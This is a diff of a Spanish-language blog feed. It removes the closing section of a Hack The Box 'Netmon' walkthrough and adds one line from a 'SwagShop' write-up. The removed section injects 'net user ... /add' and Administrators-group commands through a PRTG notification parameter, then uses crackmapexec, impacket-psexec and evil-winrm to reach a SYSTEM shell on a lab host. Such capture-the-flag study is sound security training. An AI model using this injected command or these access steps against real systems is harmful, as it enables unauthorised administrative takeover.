-&lt;p&gt;Nos vamos hasta abajo y habilitamos &lt;strong&gt;Execute Program&lt;/strong&gt; llenando los siguientes campos dela siguiente forma:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;strong&gt;Program File&lt;/strong&gt;: Demo exe notification - outfile.ps1&lt;/li&gt;
-  &lt;li&gt;&lt;strong&gt;Parameter&lt;/strong&gt;: C:\Users\Public\tester.txt; el_comando_que_queremos_ejecutar&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;De acuerdo con el exploit, nos creamos un usuario a nivel de sistema y de paso lo agregamos al grupo &lt;strong&gt;Administrators&lt;/strong&gt;. Si podemos hacer esto, significa que quien corre el programa es un usuario administrador.&lt;/p&gt;
-
-&lt;p&gt;Por lo tanto ponemos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\Users\Public\tester.txt; net user kamiyo k4miyo123$! /add; net localgroups Administrators kamiyo /add&lt;/code&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Para ejecutar la notificación, nos vamos a la que hemos creado y damos click en el icono de un papel y un lapiz y nos aparecen varias opciones; seleccionamos aquella que parece una campanita.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-netmon/netmon-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Validamos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crackmapexec smb&lt;/code&gt; si nuestro usuario fue creado:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123$!'&lt;/span&gt;
-SMB         10.10.10.152    445    NETMON           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows Server 2016 Standard 14393 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:NETMON&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:netmon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.152    445    NETMON           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] netmon&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo:k4miyo123&lt;span class=&quot;nv&quot;&gt;$!&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Pwn3d!&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Fue creado y a parte tenemos posiblidad de ingresar a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;impacket-psexec&lt;/code&gt;. En caso que no queramos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;psexec&lt;/code&gt; podríamos tratar de agregar nuestro usuario al grupo &lt;strong&gt;Remote Management Users&lt;/strong&gt; y conectarnos a la máquina con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; ya que se encuentra abierto el puerto 5985.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ impacket-psexec WORKGROUP/kamiyo:k4miyo123&lt;span class=&quot;se&quot;&gt;\$\!&lt;/span&gt;@10.10.10.152
-Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
-
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Requesting shares on 10.10.10.152.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Found writable share ADMIN&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Uploading file PrIscOHa.exe
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Opening SVCManager on 10.10.10.152.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Creating service FyEk on 10.10.10.152.....
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting service FyEk.....
-&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Press &lt;span class=&quot;nb&quot;&gt;help &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;extra shell commands
-Microsoft Windows &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Version 10.0.14393]
-&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;c&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2016 Microsoft Corporation. All rights reserved.
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;whoami
-nt authority&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem
-
-C:&lt;span class=&quot;se&quot;&gt;\W&lt;/span&gt;indows&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ystem32&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.152 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'kamiyo'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'k4miyo123$!'&lt;/span&gt;
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;netmon&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\k&lt;/span&gt;amiyo&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nt authority\system&lt;/code&gt; y podemos visualizar las flags (user.txt y root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Windows" /><category term="Powershell" /><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Netmon en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="SQL" /><category term="SQLi" /><summary type="html">Resolución de la máquina SwagShop en la plataforma de Hack The Box</summary></entry></feed>
